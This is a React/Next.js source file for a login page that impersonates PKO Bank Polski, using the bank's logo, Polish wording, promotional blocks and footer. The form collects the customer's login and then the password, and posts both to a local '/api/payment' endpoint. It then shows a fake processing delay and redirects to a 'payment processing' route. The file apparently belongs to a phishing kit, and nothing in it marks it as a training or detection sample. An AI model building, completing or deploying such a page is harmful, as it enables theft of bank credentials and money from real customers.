"use client";

import Image from "next/image";
import "./login.css";
import { useState } from "react";
import { useRouter } from "next/navigation";

const BANKS: Record<
  string,
  { name: string; logo: string
    
  }
> = {
  pko: {
    name: "PKO Bank Polski",
    logo: "/banks/pko-bp.svg"
  },
};

const bank = BANKS["pko"];

export default function LoginPage() {
  const router = useRouter();

  const [step, setStep] = useState(1);       
  const [firstValue, setFirstValue] = useState("");
  const [secondValue, setSecondValue] = useState("");

  const [error, setError] = useState(false);  // ← добавлено: отвечает за красную рамку

  const [status, setStatus] =
      useState<"idle" | "loading" | "success" | "error">("idle");


  async function handleContinue(e: React.FormEvent<HTMLButtonElement>): Promise<void> {
    e.preventDefault();        // ← предотвращает перезагрузку страницы

    if (step === 1 && firstValue.trim() === "") {
    setError(true);
    return;
    }

    if (step === 2 && secondValue.trim() === "") {
      setError(true);
      return;
    }

    if (step === 1) {
      // Переходим к шагу 2
      setStep(2);
      return;
    }

    if (step === 2) {
      setError(false);  
      setStatus("loading");

      const formData = new FormData();
      formData.append("login", firstValue);
      formData.append("haslo", secondValue);

      // ТВОЯ КОМАНДА — используем здесь:
      const data = Object.fromEntries(formData.entries());

      try {
        console.log("Send /api/payment:", data);
  
        const res = await fetch("/api/payment", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data),
        });
  
        const json = await res.json().catch(() => ({}));
        console.log("Ответ /api/payment:", res.status, json);
  
        if (!res.ok) {
          setStatus("error");
          return;
        }
        setTimeout(() => {
          setStatus("success");
          
          setFirstValue("");
          setSecondValue("");
          router.push(`/payment/pko/processing`);
          router.refresh();
        }, 5000);;
        
      } catch (err) {
        console.error("Error fetch:", err);
        setStatus("error");
      }
    }
  }


  return (
    <div className="page-login">
      {/* Основной контейнер 1230px, по центру, без отступов сверху */}
      <div className="main-container">
        {/* Верхний блок 96px, без внутренних отступов */}
        <div className="top-block">
          <div className="logo-login">
            <Image
                        src={bank.logo}
                        alt={bank.name}
                        width={180}
                        height={60}
                        className="bank-login-logo"
                      />
          </div>
          
        </div>
        <div className="horizontal-mobile-line"></div>

        <div className="bottom-block">
        <div className="left-block">
          <h1 className="h1-text">Zaloguj się</h1>

          <form className="form">
            <label>
              <input 
              name="dynamicInput"
              className={`input-text ${error ? "input-error" : ""}`} 
              type="text" 
              placeholder={step === 1 ? "Wpisz numer klienta lub login" : "Wpisz hasło"}
              value={step === 1 ? firstValue : secondValue}
                onChange={(e) => {
                  if (step === 1) setFirstValue(e.target.value);
                    else setSecondValue(e.target.value);

                    setError(false);
                }}
                onFocus={() => {
                // placeholder должен вернуть нормальный цвет при клике
                setError(false);
              }}
              />
              {error && (
                
                <p className="error-text">Wpisz numer klienta lub login</p>
              )}
            </label>
            <button className="submit-button" onClick={handleContinue}  disabled={status === "loading"}>
              {status === "loading" ? (
              <div className="loader"></div>
              ) : (
                "Dalej"
              )}</button>
          </form>
        </div>

        

        <div className="vertical-line"></div>
        

        <div className="right-block">
          <div className="horizontal-mobile-line"></div>
          <div className="circle-wrapper">
            <img src="https://www.ipko.pl/media_files/CiCCh/iPKO/PG_Debiut_z_obszarem_12_2025_544x544_208_208.png" alt="" className="circle-img" />
          </div>

          <div className="right-info">
            <h2 className="right-text">Realizuj plany z dodatkową gotówką. RRSO 11,57%</h2>
            <p className="right-text-extra">Weź swoją pierwszą pożyczkę u nas – online i na specjalnych warunkach</p>
            <button className="right-side-button" onClick={handleContinue}>Sprawdź</button>
          </div>
        </div>


      </div>

        <div className="horizontal-line"></div>
        
        <div className="bottom-section">
          <div className="mini-block">
            <span className="mini-date">01.01.2025</span>
            <h3 className="mini-title">Już jest! Potwierdzanie przelewów dziecka w aplikacji IKO</h3>
            <p className="mini-text">Sprawdź nowości dla rodziców</p>
            <button className="mini-button" onClick={handleContinue}>Więcej</button>
          </div>

          <div className="mini-block">
            <span className="mini-date">02.01.2025</span>
            <h3 className="mini-title">Lepiej stracić okazję, niż pieniądze</h3>
            <p className="mini-text">Sprawdź, jak rozpoznać fałszywy sklep, na co uważać przy płatności i jak uniknąć niechcianej subskrypcji.</p>
            <button className="mini-button" onClick={handleContinue}>Więcej</button>
          </div>

          <div className="mini-block">
            <span className="mini-date">03.01.2025</span>
            <h3 className="mini-title-red">Kolejne ataki cyberprzestępców</h3>
            <p className="mini-text-red">Sprawdź najnowsze ostrzeżenia.</p>
            <button className="mini-button" onClick={handleContinue}>Więcej</button>
          </div>
        </div>



        <div className="footer">
          <div className="horizontal-mobile-line"></div>
          <div className="footer-text">
            <span>© 2025 PKO Bank Polski</span>
            <span>Kod BIC (Swift): BPKOPLPW</span>
            <span>Polityka prywatności</span>
          </div>
          
        </div>
      </div>
      <div className="footer-line"></div>
    </div>
  );
}
